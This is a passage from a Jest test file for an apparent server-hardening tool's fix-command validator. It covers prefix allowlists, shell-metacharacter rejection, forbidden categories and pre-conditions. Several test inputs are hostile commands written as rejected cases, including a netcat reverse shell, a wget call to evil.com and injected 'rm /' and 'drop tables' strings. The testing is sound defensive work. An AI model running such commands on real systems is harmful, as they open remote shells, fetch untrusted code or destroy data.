  it("[MUTATION-KILLER] contains 'Review ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Review ");
  });

  it("[MUTATION-KILLER] contains 'Verify ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Verify ");
  });

  it("[MUTATION-KILLER] contains 'See ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("See ");
  });

  it("[MUTATION-KILLER] contains 'Update ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Update ");
  });

  it("[MUTATION-KILLER] contains 'Use ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Use ");
  });

  it("[MUTATION-KILLER] contains '# ' prefix (comment/instruction)", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("# ");
  });

  it("[MUTATION-KILLER] contains 'DEBIAN_FRONTEND' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("DEBIAN_FRONTEND");
  });

  it("[MUTATION-KILLER] contains 'curl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("curl");
  });

  it("[MUTATION-KILLER] total prefix count is correct", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES.length).toBe(64);
  });
});

describe("[MUTATION-KILLER] FORBIDDEN_CATEGORIES — exact set members", () => {
  it("[MUTATION-KILLER] SSH is forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("SSH")).toBe(true);
  });

  it("[MUTATION-KILLER] Firewall is forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("Firewall")).toBe(true);
  });

  it("[MUTATION-KILLER] Docker is forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("Docker")).toBe(true);
  });

  it("[MUTATION-KILLER] exactly 3 members", () => {
    expect(FORBIDDEN_CATEGORIES.size).toBe(3);
  });

  it("[MUTATION-KILLER] Kernel is NOT forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("Kernel")).toBe(false);
  });

  it("[MUTATION-KILLER] Accounts is NOT forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("Accounts")).toBe(false);
  });

  it("[MUTATION-KILLER] Network is NOT forbidden", () => {
    expect(FORBIDDEN_CATEGORIES.has("Network")).toBe(false);
  });
});

describe("[MUTATION-KILLER] SHELL_METACHAR regex — every character tested", () => {
  it("[MUTATION-KILLER] rejects semicolon", () => {
    expect(isFixCommandAllowed("chmod 600 /file; rm /")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects ampersand", () => {
    expect(isFixCommandAllowed("chmod 600 /file & rm")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects pipe", () => {
    expect(isFixCommandAllowed("chmod 600 /file | tee")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects backtick", () => {
    expect(isFixCommandAllowed("chmod `whoami` /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects dollar sign", () => {
    expect(isFixCommandAllowed("chmod $HOME /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects open paren", () => {
    expect(isFixCommandAllowed("chmod (test) /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects close paren", () => {
    expect(isFixCommandAllowed("chmod ) /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects greater-than", () => {
    expect(isFixCommandAllowed("echo test > /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects less-than", () => {
    expect(isFixCommandAllowed("echo test < /file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects newline", () => {
    expect(isFixCommandAllowed("chmod 600\n/file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects carriage return", () => {
    expect(isFixCommandAllowed("chmod 600\r/file")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects null byte", () => {
    expect(isFixCommandAllowed("chmod 600\0/file")).toBe(false);
  });
});

describe("[MUTATION-KILLER] isFixCommandAllowed — prefix matching correctness", () => {
  it("[MUTATION-KILLER] accepts 'chmod 600 /etc/shadow'", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/shadow")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'chown root:root /etc/shadow'", () => {
    expect(isFixCommandAllowed("chown root:root /etc/shadow")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'sysctl -w net.ipv4.conf.all.rp_filter=1'", () => {
    expect(isFixCommandAllowed("sysctl -w net.ipv4.conf.all.rp_filter=1")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'systemctl restart sshd'", () => {
    expect(isFixCommandAllowed("systemctl restart sshd")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'apt install aide -y'", () => {
    expect(isFixCommandAllowed("apt install aide -y")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'kastell audit --fix'", () => {
    expect(isFixCommandAllowed("kastell audit --fix")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'Ensure password complexity is configured'", () => {
    expect(isFixCommandAllowed("Ensure password complexity is configured")).toBe(true);
  });

  it("[MUTATION-KILLER] accepts 'DEBIAN_FRONTEND=noninteractive apt-get install -y aide'", () => {
    expect(isFixCommandAllowed("DEBIAN_FRONTEND=noninteractive apt-get install -y aide")).toBe(true);
  });

  it("[MUTATION-KILLER] rejects empty string", () => {
    expect(isFixCommandAllowed("")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects 'wget http://evil.com'", () => {
    expect(isFixCommandAllowed("wget http://evil.com")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects 'python3 -c evil'", () => {
    expect(isFixCommandAllowed("python3 -c evil")).toBe(false);
  });

  it("[MUTATION-KILLER] rejects 'nc -e /bin/sh 10.0.0.1 4444'", () => {
    expect(isFixCommandAllowed("nc -e /bin/sh 10.0.0.1 4444")).toBe(false);
  });
});

describe("[MUTATION-KILLER] getPreCondition — string content", () => {
  it("[MUTATION-KILLER] SSH password auth pre-condition checks authorized_keys", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PWD",
          category: "SSH",
          name: "Password Authentication disabled",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check).toBeDefined();
    expect(check!.preCondition).toContain("test -f ~/.ssh/authorized_keys");
    expect(check!.preCondition).toContain("test -s ~/.ssh/authorized_keys");
  });

  it("[MUTATION-KILLER] Firewall ufw pre-condition checks SSH port 22", () => {
    const result = makeResult([
      makeCategory("Firewall", [
        makeCheck({
          id: "FW-01",
          category: "Firewall",
          name: "UFW enabled",
          severity: "warning",
          passed: false,
          fixCommand: "ufw --force enable",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check).toBeDefined();
    expect(check!.preCondition).toContain("ufw status");
    expect(check!.preCondition).toContain("22");
    expect(check!.preCondition).toContain("ssh");
  });

  it("[MUTATION-KILLER] non-SSH non-Firewall check has no pre-condition", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "K-01",
          category: "Kernel",
          name: "Kernel hardening",
          severity: "warning",
          passed: false,
          fixCommand: "sysctl -w kernel.dmesg_restrict=1",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check).toBeDefined();
    expect(check!.preCondition).toBeUndefined();
  });
});

describe("[MUTATION-KILLER] SEVERITY_ORDER — used in previewFixes grouping", () => {
  it("[MUTATION-KILLER] groups appear in order: critical, warning, info", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "T-INFO", category: "Test", severity: "info", passed: false, fixCommand: "echo info" }),
        makeCheck({ id: "T-CRIT", category: "Test", severity: "critical", passed: false, fixCommand: "echo crit" }),
        makeCheck({ id: "T-WARN", category: "Test", severity: "warning", passed: false, fixCommand: "echo warn" }),
      ]),
    ]);

    const plan = previewFixes(result);
    expect(plan.groups).toHaveLength(3);
    expect(plan.groups[0].severity).toBe("critical");
    expect(plan.groups[1].severity).toBe("warning");
    expect(plan.groups[2].severity).toBe("info");
  });
});

describe("[MUTATION-KILLER] FixResult interface field names", () => {
  it("[MUTATION-KILLER] dry-run result has applied, skipped, errors, preview fields", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "T-01", severity: "warning", passed: false, fixCommand: "echo test" }),
      ]),
    ]);

    const fixResult = { applied: [] as string[], skipped: [] as string[], errors: [] as string[], preview: previewFixes(result) };
    expect(fixResult).toHaveProperty("applied");
    expect(fixResult).toHaveProperty("skipped");
    expect(fixResult).toHaveProperty("errors");
    expect(fixResult).toHaveProperty("preview");
    expect(Array.isArray(fixResult.applied)).toBe(true);
    expect(Array.isArray(fixResult.skipped)).toBe(true);
    expect(Array.isArray(fixResult.errors)).toBe(true);
  });
});

describe("[MUTATION-KILLER] FixCheck interface field population", () => {
  it("[MUTATION-KILLER] FixCheck has id, category, name, severity, fixCommand fields", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "KERN-01",
          category: "Kernel",
          name: "Kernel Hardening",
          severity: "critical",
          passed: false,
          fixCommand: "sysctl -w kernel.dmesg_restrict=1",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const check = plan.groups[0].checks[0];
    expect(check.id).toBe("KERN-01");
    expect(check.category).toBe("Kernel");
    expect(check.name).toBe("Kernel Hardening");
    expect(check.severity).toBe("critical");
    expect(check.fixCommand).toBe("sysctl -w kernel.dmesg_restrict=1");
  });
});

describe("[MUTATION-KILLER] resolveTier — tier string values", () => {
  const check = makeCheck();

  it("[MUTATION-KILLER] returns exactly 'FORBIDDEN' string for SSH", () => {
    const result = resolveTier(check, "SSH");
    expect(result).toBe("FORBIDDEN");
    expect(result).not.toBe("");
    expect(result).not.toBe("SAFE");
    expect(result).not.toBe("GUARDED");
  });

  it("[MUTATION-KILLER] returns exactly 'GUARDED' string for default", () => {
    const result = resolveTier(check, "Other");
    expect(result).toBe("GUARDED");
    expect(result).not.toBe("");
    expect(result).not.toBe("SAFE");
    expect(result).not.toBe("FORBIDDEN");
  });

  it("[MUTATION-KILLER] returns exactly 'SAFE' string for SAFE check", () => {
    const safeCheck = makeCheck({ safeToAutoFix: "SAFE" });
    const result = resolveTier(safeCheck, "Kernel");
    expect(result).toBe("SAFE");
    expect(result).not.toBe("");
    expect(result).not.toBe("GUARDED");
    expect(result).not.toBe("FORBIDDEN");
  });
});

describe("[MUTATION-KILLER] error message format strings in runFix", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("[MUTATION-KILLER] pre-condition failure message contains 'pre-condition failed'", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PWD",
          category: "SSH",
          name: "Password Auth",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toContain("pre-condition failed");
    expect(fixResult.errors[0]).toContain("SSH-PWD");
  });

  it("[MUTATION-KILLER] rejected command message contains 'fix command rejected'", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "T-INJECT",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "malicious; drop tables",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toContain("fix command rejected");
    expect(fixResult.errors[0]).toContain("T-INJECT");
  });

  it("[MUTATION-KILLER] command failure message contains 'command failed' and exit code", async () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({
          id: "K-01",
          category: "Kernel",
          severity: "warning",
          passed: false,
          fixCommand: "sysctl -w net.ipv4.ip_forward=0",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValueOnce({ code: 127, stdout: "", stderr: "not found" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors[0]).toContain("command failed");
    expect(fixResult.errors[0]).toContain("exit 127");
    expect(fixResult.errors[0]).toContain("not found");
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// MUTATION-KILLER WAVE 2: Deep string-level assertions for fix.ts
// Targets individual StringLiterals that survived Wave 1
// ═══════════════════════════════════════════════════════════════════════════════

describe("[MUTATION-KILLER] getPreCondition — exact string values", () => {
  it("[MUTATION-KILLER] SSH pre-condition contains ~/.ssh/authorized_keys path", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PWDAUTH",
          category: "SSH",
          name: "Disable Password Auth",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);
    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check).toBeDefined();
    expect(check!.preCondition).toBe("test -f ~/.ssh/authorized_keys && test -s ~/.ssh/authorized_keys");
  });

  it("[MUTATION-KILLER] Firewall pre-condition exact string for ufw check", () => {
    const result = makeResult([
      makeCategory("Firewall", [
        makeCheck({
          id: "FW-UFW",
          category: "Firewall",
          name: "Enable UFW",
          severity: "warning",
          passed: false,
          fixCommand: "ufw --force enable",
        }),
      ]),
    ]);
    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check).toBeDefined();
    expect(check!.preCondition).toBe("ufw status | grep -q '22\\|ssh'");
  });

  it("[MUTATION-KILLER] SSH check without password keyword has no pre-condition", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-ROOT",
          category: "SSH",
          name: "Root Login Disabled",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);
    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check!.preCondition).toBeUndefined();
  });

  it("[MUTATION-KILLER] SSH check without PasswordAuthentication in fixCommand has no pre-condition", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: "SSH-PWD2",
          category: "SSH",
          name: "Password complexity check",
          severity: "warning",
          passed: false,
          fixCommand: "sed -i 's/old/new/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);
    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check!.preCondition).toBeUndefined();
  });

  it("[MUTATION-KILLER] Firewall check without ufw in fixCommand has no pre-condition", () => {
    const result = makeResult([
      makeCategory("Firewall", [
        makeCheck({
          id: "FW-IPTABLES",
          category: "Firewall",
          name: "iptables default policy",
          severity: "warning",
          passed: false,
          fixCommand: "iptables -P INPUT DROP",
        }),
      ]),
    ]);
    const plan = previewFixes(result);
    const check = plan.groups[0]?.checks[0];
    expect(check!.preCondition).toBeUndefined();
  });
});

describe("[MUTATION-KILLER] FORBIDDEN_CATEGORIES — string values", () => {
  it("[MUTATION-KILLER] 'SSH' string exact", () => {
    expect([...FORBIDDEN_CATEGORIES]).toContain("SSH");
  });

  it("[MUTATION-KILLER] 'Firewall' string exact", () => {
    expect([...FORBIDDEN_CATEGORIES]).toContain("Firewall");
  });

  it("[MUTATION-KILLER] 'Docker' string exact", () => {
    expect([...FORBIDDEN_CATEGORIES]).toContain("Docker");
  });

  it("[MUTATION-KILLER] iterating FORBIDDEN_CATEGORIES gives exactly 3 items", () => {
    const items = [...FORBIDDEN_CATEGORIES];
    expect(items).toHaveLength(3);
    expect(items).toEqual(expect.arrayContaining(["SSH", "Firewall", "Docker"]));
  });
});

describe("[MUTATION-KILLER] resolveTier — FORBIDDEN string returned from has()", () => {
  it("[MUTATION-KILLER] SSH returns 'FORBIDDEN' not empty string", () => {
    const result = resolveTier(makeCheck(), "SSH");
    expect(result.length).toBeGreaterThan(0);
    expect(result).toBe("FORBIDDEN");
  });

  it("[MUTATION-KILLER] Firewall returns 'FORBIDDEN' not empty string", () => {
    const result = resolveTier(makeCheck(), "Firewall");
    expect(result.length).toBeGreaterThan(0);
    expect(result).toBe("FORBIDDEN");
  });

  it("[MUTATION-KILLER] Docker returns 'FORBIDDEN' not empty string", () => {
    const result = resolveTier(makeCheck(), "Docker");
    expect(result.length).toBeGreaterThan(0);
    expect(result).toBe("FORBIDDEN");
  });

  it("[MUTATION-KILLER] Unknown category with undefined safeToAutoFix returns 'GUARDED'", () => {
    const check = makeCheck({ safeToAutoFix: undefined });
    const result = resolveTier(check, "Logging");
    expect(result).toBe("GUARDED");
    expect(result.length).toBeGreaterThan(0);
  });
});

describe("[MUTATION-KILLER] KNOWN_AUDIT_FIX_PREFIXES — functional verification", () => {
  it("[MUTATION-KILLER] each prefix is a non-empty string", () => {
    for (const prefix of KNOWN_AUDIT_FIX_PREFIXES) {
      expect(prefix.length).toBeGreaterThan(0);
    }
  });

  it("[MUTATION-KILLER] no duplicate prefixes", () => {
    const unique = new Set(KNOWN_AUDIT_FIX_PREFIXES);
    expect(unique.size).toBe(KNOWN_AUDIT_FIX_PREFIXES.length);
  });

  it("[MUTATION-KILLER] 'sed ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("sed ");
    expect(KNOWN_AUDIT_FIX_PREFIXES).not.toContain("sed");
  });

  it("[MUTATION-KILLER] 'apt ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("apt ");
  });

  it("[MUTATION-KILLER] 'ufw ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ufw ");
  });

  it("[MUTATION-KILLER] 'ip ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ip ");
  });

  it("[MUTATION-KILLER] 'ss ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ss ");
  });

  it("[MUTATION-KILLER] 'echo ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("echo ");
  });

  it("[MUTATION-KILLER] 'find ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("find ");
  });

  it("[MUTATION-KILLER] 'rm ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("rm ");
  });

  it("[MUTATION-KILLER] 'ls ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ls ");
  });

  it("[MUTATION-KILLER] 'grep ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("grep ");
  });

  it("[MUTATION-KILLER] 'jq ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("jq ");
  });

  it("[MUTATION-KILLER] 'awk ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("awk ");
  });

  it("[MUTATION-KILLER] 'export ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("export ");
  });

  it("[MUTATION-KILLER] 'df ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("df ");
  });

  it("[MUTATION-KILLER] 'Add ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Add ");
  });

  it("[MUTATION-KILLER] 'Remove ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Remove ");
  });

  it("[MUTATION-KILLER] 'Edit ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Edit ");
  });

  it("[MUTATION-KILLER] 'Create ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Create ");
  });

  it("[MUTATION-KILLER] 'Configure ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Configure ");
  });

  it("[MUTATION-KILLER] 'Ensure ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Ensure ");
  });

  it("[MUTATION-KILLER] 'Review ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Review ");
  });

  it("[MUTATION-KILLER] 'Verify ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Verify ");
  });

  it("[MUTATION-KILLER] 'See ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("See ");
  });

  it("[MUTATION-KILLER] 'Update ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Update ");
  });

  it("[MUTATION-KILLER] 'Use ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Use ");
  });

  it("[MUTATION-KILLER] '# ' prefix has trailing space", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("# ");
  });
});

describe("[MUTATION-KILLER] isFixCommandAllowed — startsWith matching for each prefix", () => {
  it("[MUTATION-KILLER] chmod command is allowed", () => {
    expect(isFixCommandAllowed("chmod 644 /etc/passwd")).toBe(true);
  });

  it("[MUTATION-KILLER] chown command is allowed", () => {
    expect(isFixCommandAllowed("chown root:root /etc/passwd")).toBe(true);
  });

  it("[MUTATION-KILLER] sed command is allowed", () => {
    expect(isFixCommandAllowed("sed -i 's/old/new/' /etc/file")).toBe(true);
  });

  it("[MUTATION-KILLER] systemctl command is allowed", () => {
    expect(isFixCommandAllowed("systemctl enable fail2ban")).toBe(true);
  });

  it("[MUTATION-KILLER] apt command is allowed", () => {
    expect(isFixCommandAllowed("apt install unattended-upgrades -y")).toBe(true);
  });

  it("[MUTATION-KILLER] apt-get command is allowed", () => {
    expect(isFixCommandAllowed("apt-get install aide -y")).toBe(true);
  });

  it("[MUTATION-KILLER] dpkg command is allowed", () => {
    expect(isFixCommandAllowed("dpkg --configure -a")).toBe(true);
  });

  it("[MUTATION-KILLER] sysctl command is allowed", () => {
    expect(isFixCommandAllowed("sysctl -p")).toBe(true);
  });

  it("[MUTATION-KILLER] passwd command is allowed", () => {
    expect(isFixCommandAllowed("passwd -l nobody")).toBe(true);
  });

  it("[MUTATION-KILLER] useradd command is allowed", () => {
    expect(isFixCommandAllowed("useradd -r -s /sbin/nologin audit")).toBe(true);
  });

  it("[MUTATION-KILLER] gpasswd command is allowed", () => {
    expect(isFixCommandAllowed("gpasswd -d user sudo")).toBe(true);
  });

  it("[MUTATION-KILLER] visudo command is allowed", () => {
    expect(isFixCommandAllowed("visudo -c")).toBe(true);
  });

  it("[MUTATION-KILLER] reboot command is allowed", () => {
    expect(isFixCommandAllowed("reboot")).toBe(true);
  });

  it("[MUTATION-KILLER] ufw command is allowed", () => {
    expect(isFixCommandAllowed("ufw default deny incoming")).toBe(true);
  });

  it("[MUTATION-KILLER] iptables command is allowed", () => {
    expect(isFixCommandAllowed("iptables -P INPUT DROP")).toBe(true);
  });

  it("[MUTATION-KILLER] ip6tables command is allowed", () => {
    expect(isFixCommandAllowed("ip6tables -P INPUT DROP")).toBe(true);
  });

  it("[MUTATION-KILLER] ip command is allowed", () => {
    expect(isFixCommandAllowed("ip route show")).toBe(true);
  });

  it("[MUTATION-KILLER] ss command is allowed", () => {
    expect(isFixCommandAllowed("ss -tlnp")).toBe(true);
  });

  it("[MUTATION-KILLER] echo command without metachar is allowed", () => {
    expect(isFixCommandAllowed("echo test")).toBe(true);
  });

  it("[MUTATION-KILLER] find command is allowed", () => {
    expect(isFixCommandAllowed("find /etc -name '*.conf' -type f")).toBe(true);
  });

  it("[MUTATION-KILLER] touch command is allowed", () => {
    expect(isFixCommandAllowed("touch /etc/cron.allow")).toBe(true);
  });

  it("[MUTATION-KILLER] mkdir command is allowed", () => {
    expect(isFixCommandAllowed("mkdir -p /etc/audit")).toBe(true);
  });

  it("[MUTATION-KILLER] rm command is allowed", () => {
    expect(isFixCommandAllowed("rm /etc/hosts.equiv")).toBe(true);
  });

  it("[MUTATION-KILLER] ls command is allowed", () => {
    expect(isFixCommandAllowed("ls -la /etc/audit")).toBe(true);
  });

  it("[MUTATION-KILLER] grep command is allowed", () => {
    expect(isFixCommandAllowed("grep -r 'test' /etc")).toBe(true);
  });

  it("[MUTATION-KILLER] jq command is allowed", () => {
    expect(isFixCommandAllowed("jq '.key' /etc/docker/daemon.json")).toBe(true);
  });

  it("[MUTATION-KILLER] awk command is allowed", () => {
    expect(isFixCommandAllowed("awk -F: '{print}' /etc/passwd")).toBe(true);
  });

  it("[MUTATION-KILLER] openssl command is allowed", () => {
    expect(isFixCommandAllowed("openssl dhparam -out /etc/ssl/dhparams.pem 4096")).toBe(true);
  });

  it("[MUTATION-KILLER] export command is allowed", () => {
    expect(isFixCommandAllowed("export DOCKER_CONTENT_TRUST=1")).toBe(true);
  });

  it("[MUTATION-KILLER] aide command is allowed", () => {
    expect(isFixCommandAllowed("aide --check")).toBe(true);
  });

  it("[MUTATION-KILLER] aideinit command is allowed", () => {
    expect(isFixCommandAllowed("aideinit")).toBe(true);
  });

  it("[MUTATION-KILLER] rkhunter command is allowed", () => {
    expect(isFixCommandAllowed("rkhunter --check")).toBe(true);
  });

  it("[MUTATION-KILLER] aa-enforce command is allowed", () => {
    expect(isFixCommandAllowed("aa-enforce /etc/apparmor.d/usr.bin.firefox")).toBe(true);
  });

  it("[MUTATION-KILLER] aa-genprof command is allowed", () => {
    expect(isFixCommandAllowed("aa-genprof nginx")).toBe(true);
  });

  it("[MUTATION-KILLER] auditctl command is allowed", () => {
    expect(isFixCommandAllowed("auditctl -w /etc/passwd -p wa")).toBe(true);
  });

  it("[MUTATION-KILLER] mokutil command is allowed", () => {
    expect(isFixCommandAllowed("mokutil --sb-state")).toBe(true);
  });

  it("[MUTATION-KILLER] setenforce command is allowed", () => {
    expect(isFixCommandAllowed("setenforce 1")).toBe(true);
  });

  it("[MUTATION-KILLER] cryptsetup command is allowed", () => {
    expect(isFixCommandAllowed("cryptsetup status")).toBe(true);
  });

  it("[MUTATION-KILLER] ssh-keygen command is allowed", () => {
    expect(isFixCommandAllowed("ssh-keygen -t ed25519")).toBe(true);
  });

  it("[MUTATION-KILLER] docker command is allowed", () => {
    expect(isFixCommandAllowed("docker system prune")).toBe(true);
  });

  it("[MUTATION-KILLER] logrotate command is allowed", () => {
    expect(isFixCommandAllowed("logrotate -f /etc/logrotate.conf")).toBe(true);
  });

  it("[MUTATION-KILLER] chronyc command is allowed", () => {
    expect(isFixCommandAllowed("chronyc tracking")).toBe(true);
  });

  it("[MUTATION-KILLER] hwclock command is allowed", () => {
    expect(isFixCommandAllowed("hwclock --systohc")).toBe(true);
  });

  it("[MUTATION-KILLER] timedatectl command is allowed", () => {
    expect(isFixCommandAllowed("timedatectl set-ntp true")).toBe(true);
  });

  it("[MUTATION-KILLER] grub-mkpasswd-pbkdf2 command is allowed", () => {
    expect(isFixCommandAllowed("grub-mkpasswd-pbkdf2")).toBe(true);
  });

  it("[MUTATION-KILLER] uname command is allowed", () => {
    expect(isFixCommandAllowed("uname -r")).toBe(true);
  });

  it("[MUTATION-KILLER] df command is allowed", () => {
    expect(isFixCommandAllowed("df -h /")).toBe(true);
  });

  it("[MUTATION-KILLER] certbot command is allowed", () => {
    expect(isFixCommandAllowed("certbot renew")).toBe(true);
  });

  it("[MUTATION-KILLER] ssl_protocols command is allowed", () => {
    expect(isFixCommandAllowed("ssl_protocols TLSv1.2 TLSv1.3")).toBe(true);
  });

  it("[MUTATION-KILLER] kastell command is allowed", () => {
    expect(isFixCommandAllowed("kastell lock")).toBe(true);
  });

  it("[MUTATION-KILLER] Add instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Add SSH key for admin user")).toBe(true);
  });

  it("[MUTATION-KILLER] Remove instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Remove unnecessary service")).toBe(true);
  });

  it("[MUTATION-KILLER] Edit instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Edit /etc/ssh/sshd_config manually")).toBe(true);
  });

  it("[MUTATION-KILLER] Create instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Create a backup before proceeding")).toBe(true);
  });

  it("[MUTATION-KILLER] Configure instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Configure firewall rules manually")).toBe(true);
  });

  it("[MUTATION-KILLER] Ensure instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Ensure SSH key exists before disabling password auth")).toBe(true);
  });

  it("[MUTATION-KILLER] Review instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Review audit results")).toBe(true);
  });

  it("[MUTATION-KILLER] Verify instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Verify DNS configuration")).toBe(true);
  });

  it("[MUTATION-KILLER] See instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("See documentation for details")).toBe(true);
  });

  it("[MUTATION-KILLER] Update instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Update system packages")).toBe(true);
  });

  it("[MUTATION-KILLER] Use instructional prefix is allowed", () => {
    expect(isFixCommandAllowed("Use kastell lock for automated hardening")).toBe(true);
  });

  it("[MUTATION-KILLER] # comment prefix is allowed", () => {
    expect(isFixCommandAllowed("# Manual step required")).toBe(true);
  });

  it("[MUTATION-KILLER] DEBIAN_FRONTEND prefix is allowed", () => {
